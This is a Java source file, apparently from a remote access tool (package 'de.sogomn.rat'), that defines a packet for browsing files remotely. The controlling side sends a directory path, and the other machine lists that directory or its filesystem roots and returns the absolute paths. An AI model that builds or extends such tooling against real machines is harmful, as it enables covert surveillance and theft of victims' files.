package de.sogomn.rat.packet;

import java.io.File;
import java.util.ArrayList;
import java.util.stream.Stream;

import de.sogomn.rat.ActiveConnection;

public class FileRequestPacket extends AbstractPingPongPacket {
	
	private String rootFile;
	
	private String[] paths;
	
	private static final byte INCOMING = 1;
	private static final byte END = 0;
	private static final String FILE_SEPARATOR = "/";
	
	public FileRequestPacket(final String rootFile) {
		this.rootFile = rootFile;
		
		type = REQUEST;
		paths = new String[0];
	}
	
	public FileRequestPacket() {
		this("");
		
		type = DATA;
	}
	
	@Override
	protected void sendRequest(final ActiveConnection connection) {
		connection.writeUtf(rootFile);
	}
	
	@Override
	protected void sendData(final ActiveConnection connection) {
		for (final String path : paths) {
			connection.writeByte(INCOMING);
			connection.writeUtf(path);
		}
		
		connection.writeByte(END);
	}
	
	@Override
	protected void receiveRequest(final ActiveConnection connection) {
		rootFile = connection.readUtf();
	}
	
	@Override
	protected void receiveData(final ActiveConnection connection) {
		final ArrayList<String> pathList = new ArrayList<String>();
		
		while (connection.readByte() == INCOMING) {
			final String path = connection.readUtf();
			
			pathList.add(path);
		}
		
		paths = new String[pathList.size()];
		paths = pathList.toArray(paths);
	}
	
	@Override
	protected void executeRequest(final ActiveConnection connection) {
		final File[] children;
		
		if (rootFile.isEmpty() || rootFile.equals(FILE_SEPARATOR)) {
			children = File.listRoots();
		} else {
			final File file = new File(rootFile);
			
			children = file.listFiles();
		}
		
		if (children != null) {
			paths = Stream
					.of(children)
					.map(File::getAbsolutePath)
					.toArray(String[]::new);
		}
		
		type = DATA;
		connection.addPacket(this);
	}
	
	@Override
	protected void executeData(final ActiveConnection connection) {
		//...
	}
	
	public String[] getPaths() {
		return paths;
	}
	
}
